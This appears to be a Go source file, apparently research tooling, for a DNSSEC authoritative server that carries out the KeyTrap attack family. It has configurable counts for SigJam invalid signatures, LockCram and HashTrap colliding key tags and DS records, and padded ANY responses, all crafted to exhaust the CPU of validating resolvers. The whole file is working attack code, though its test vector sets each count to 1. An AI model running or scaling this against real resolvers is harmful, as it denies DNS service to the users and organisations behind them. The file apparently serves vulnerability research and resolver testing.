package main

import (
	"net"
	"sort"
	"strings"
	"time"

	"github.com/tochusc/godns"
	"github.com/tochusc/godns/dns"
	"github.com/tochusc/godns/dns/xperi"
)

// 测试的KeyTrap攻击向量
var ExperiVec = KeyTrapVector{
	CollidedSigNum: 1,
	CollidedZSKNum: 1,
	CollidedKSKNum: 1,
	CollidedDSNum:  1,
	ANYRRSetNum:    1,
	DS_KSK_PairNum: 1,
}

// KeyTrap攻击向量
type KeyTrapVector struct {
	// SigJam
	CollidedSigNum int
	// LockCram
	CollidedZSKNum int
	// HashTrap
	CollidedKSKNum int
	CollidedDSNum  int
	// ANY
	ANYRRSetNum int

	// HashTrap v2
	DS_KSK_PairNum int
}

type KeyTrapManager struct {
	// DNSSEC 配置
	DNSSECConf godns.DNSSECConfig

	// 区域名与其相应 DNSSEC 材料的映射
	// 在初始化 DNSSEC Responser 时需要为其手动添加信任锚点
	DNSSECMap map[string]godns.DNSSECMaterial

	// KeyTrap攻击向量
	AttackVec KeyTrapVector
	KSKTagMap map[int]dns.DNSRDATADNSKEY
}

func (m KeyTrapManager) SignSection(section []dns.DNSResourceRecord) []dns.DNSResourceRecord {
	rMap := make(map[string][]dns.DNSResourceRecord)
	for _, rr := range section {
		if rr.Type == dns.DNSRRTypeRRSIG {
			continue
		}
		rid := rr.Name + rr.Type.String() + rr.Class.String()
		rMap[rid] = append(rMap[rr.Name], rr)
	}
	for _, rrset := range rMap {
		// SigJam攻击向量：CollidedSigNum
		// 生成 错误RRSIG 记录
		uName := dns.GetUpperDomainName(&rrset[0].Name)
		dMat := m.GetDNSSECMaterial(uName)

		for i := 0; i < m.AttackVec.CollidedSigNum; i++ {
			wRRSIG := xperi.GenerateRandomRRRRSIG(
				rrset,
				m.DNSSECConf.DAlgo,
				uint32(time.Now().UTC().Unix()+86400-3600),
				uint32(time.Now().UTC().Unix()-3600),
				uint16(dMat.ZSKTag),
				uName,
			)
			section = append(section, wRRSIG)
		}

		sig := m.SignRRSet(rrset)
		section = append(section, sig)
	}
	return section
}

func (m KeyTrapManager) SignRRSet(rrset []dns.DNSResourceRecord) dns.DNSResourceRecord {
	uName := dns.GetUpperDomainName(&rrset[0].Name)
	dMat := m.GetDNSSECMaterial(uName)

	sort.Sort(dns.ByCanonicalOrder(rrset))

	sig := xperi.GenerateRRRRSIG(
		rrset,
		m.DNSSECConf.DAlgo,
		uint32(time.Now().UTC().Unix()+86400-3600),
		uint32(time.Now().UTC().Unix()-3600),
		uint16(dMat.ZSKTag),
		uName,
		dMat.PrivateZSK,
	)
	return sig
}

func (m KeyTrapManager) EnableDNSSEC(qry dns.DNSMessage, resp *dns.DNSMessage) {
	qType := qry.Question[0].Type

	// ANY攻击向量
	if qType == dns.DNSQTypeANY {
		// 生成任意类型的 RR 集合
		anyset := []dns.DNSResourceRecord{}
		var sType = 4096
		for i := 0; i < m.AttackVec.ANYRRSetNum; i++ {
			rr := dns.DNSResourceRecord{
				Name:  qry.Question[0].Name,
				Type:  dns.DNSType(sType + i),
				Class: dns.DNSClassIN,
				TTL:   86400,
				RDLen: 0,
				RData: &dns.DNSRDATAA{Address: net.IPv4(10, 10, 10, 10)},
			}
			anyset = append(anyset, rr)
		}
		resp.Answer = append(resp.Answer, anyset...)
	}

	// 签名回答部分
	resp.Answer = m.SignSection(resp.Answer)
	// 签名权威部分
	resp.Authority = m.SignSection(resp.Authority)
	// 签名附加部分
	resp.Additional = m.SignSection(resp.Additional)
	m.EstablishToC(qry, resp)
}

func (m KeyTrapManager) CreateDNSSECMaterial(zName string) godns.DNSSECMaterial {
	pubZSK, privZSKBytes := xperi.GenerateRRDNSKEY(zName, m.DNSSECConf.DAlgo, dns.DNSKEYFlagZoneKey)
	zSKTag := xperi.CalculateKeyTag(*pubZSK.RData.(*dns.DNSRDATADNSKEY))
	keyset := []dns.DNSResourceRecord{pubZSK}
	// LockCram攻击向量：CollidedKeyNum
	// 生成 错误ZSK DNSKEY 记录
	for i := 0; i < m.AttackVec.CollidedZSKNum; i++ {
		wZSK := xperi.GenerateRandomDNSKEYWithTag(
			m.DNSSECConf.DAlgo,
			dns.DNSKEYFlagZoneKey,
			int(zSKTag),
		)
		keyset = append(keyset, dns.DNSResourceRecord{
			Name:  zName,
			Type:  dns.DNSRRTypeDNSKEY,
			Class: dns.DNSClassIN,
			TTL:   86400,
			RDLen: uint16(wZSK.Size()),
			RData: &wZSK,
		})
	}

	mKeyTag := uint16(0x0000)
	mKeyPriv := []byte{}

	// HashTrap v2 攻击向量: DS_KSK_PairNum
	for i := 0; i < m.AttackVec.DS_KSK_PairNum; i++ {
		pubKSK, privKSKBytes := xperi.GenerateRRDNSKEY(zName, m.DNSSECConf.DAlgo, dns.DNSKEYFlagSecureEntryPoint)
		kSKTag := xperi.CalculateKeyTag(*pubKSK.RData.(*dns.DNSRDATADNSKEY))

		if _, ok := m.KSKTagMap[int(kSKTag)]; ok {
			i--
			continue
		} else {
			m.KSKTagMap[int(kSKTag)] = *pubKSK.RData.(*dns.DNSRDATADNSKEY)

			keyset = append(keyset, pubKSK)
			if kSKTag > mKeyTag {
				mKeyTag = kSKTag
				mKeyPriv = privKSKBytes
			}

			// HashTrap攻击向量: CollidedKSKNum
			// 生成 错误KSK DNSKEY 记录
			for i := 0; i < m.AttackVec.CollidedKSKNum; i++ {
				wKSK := xperi.GenerateRandomDNSKEYWithTag(
					m.DNSSECConf.DAlgo,
					dns.DNSKEYFlagSecureEntryPoint,
					int(kSKTag),
				)
				keyset = append(keyset, dns.DNSResourceRecord{
					Name:  zName,
					Type:  dns.DNSRRTypeDNSKEY,
					Class: dns.DNSClassIN,
					TTL:   86400,
					RDLen: uint16(wKSK.Size()),
					RData: &wKSK,
				})
			}
		}
	}

	sort.Sort(dns.ByCanonicalOrder(keyset))

	// 生成密钥集签名
	keySig := xperi.GenerateRRRRSIG(
		keyset,
		dns.DNSSECAlgorithmECDSAP384SHA384,
		uint32(time.Now().UTC().Unix()+86400-3600),
		uint32(time.Now().UTC().Unix()-3600),
		mKeyTag,
		zName,
		mKeyPriv,
	)
	// 生成 DNSSEC 材料
	resp := append(keyset, keySig)
	return godns.DNSSECMaterial{
		KSKTag:        int(mKeyTag),
		ZSKTag:        int(zSKTag),
		PrivateKSK:    mKeyPriv,
		PrivateZSK:    privZSKBytes,
		DNSKEYRespSec: resp,
	}
}

// GetDNSSECMaterial 获取指定区域的 DNSSEC 材料
// 如果该区域的 DNSSEC 材料不存在，则会根据 DNSSEC 配置生成一个
func (m KeyTrapManager) GetDNSSECMaterial(zName string) godns.DNSSECMaterial {
	dMat, ok := m.DNSSECMap[zName]
	if !ok {
		m.DNSSECMap[zName] = m.CreateDNSSECMaterial(zName)
		dMat = m.DNSSECMap[zName]
	}
	return dMat
}

// EstablishToC 根据查询自动添加 DNSKEY，DS，RRSIG 记录
// 自动完成信任链（Trust of Chain）的建立。
// 其接受参数为：
//   - qry dns.DNSMessage，查询信息
//   - dConf DNSSECConfig，DNSSEC 配置
//   - dMap map[string]DNSSECMaterial，区域名与其相应 DNSSEC 材料的映射
//   - resp *dns.DNSMessage，回复信息
func (m KeyTrapManager) EstablishToC(qry dns.DNSMessage, resp *dns.DNSMessage) error {
	// 提取查询类型和查询名称
	qType := qry.Question[0].Type
	qName := strings.ToLower(qry.Question[0].Name)
	dMat := m.GetDNSSECMaterial(qName)

	if qType == dns.DNSRRTypeDNSKEY {
		// 如果查询类型为 DNSKEY，则返回相应的 DNSKEY 记录
		resp.Answer = append(resp.Answer, dMat.DNSKEYRespSec...)
		resp.Header.RCode = dns.DNSResponseCodeNoErr
	} else if qType == dns.DNSRRTypeDS {
		// 如果查询类型为 DS，则生成 DS 记录
		dMat := m.GetDNSSECMaterial(qName)

		dsset := []dns.DNSResourceRecord{}
		for _, kRDATA := range m.KSKTagMap {
			// HashTrap攻击向量：CollidedDSNum
			// 生成 错误DS 记录
			for i := 0; i < m.AttackVec.CollidedDSNum; i++ {
				wDS := xperi.GenerateRandomRRDS(qName, kRDATA, m.DNSSECConf.DType)
				dsset = append(dsset, wDS)
			}
			ds := xperi.GenerateRRDS(
				qName,
				kRDATA,
				m.DNSSECConf.DType,
			)
			dsset = append(dsset, ds)
		}
		// 生成 ZSK 签名
		upName := dns.GetUpperDomainName(&qName)
		dMat = m.GetDNSSECMaterial(upName)

		sort.Sort(dns.ByCanonicalOrder(dsset))

		sig := xperi.GenerateRRRRSIG(
			dsset,
			m.DNSSECConf.DAlgo,
			uint32(time.Now().UTC().Unix()+86400-3600),
			uint32(time.Now().UTC().Unix()-3600),
			uint16(dMat.ZSKTag),
			upName,
			dMat.PrivateZSK,
		)
		dsset = append(dsset, sig)

		resp.Answer = append(resp.Answer, dsset...)
		resp.Header.RCode = dns.DNSResponseCodeNoErr
	}
	godns.FixCount(resp)
	return nil
}
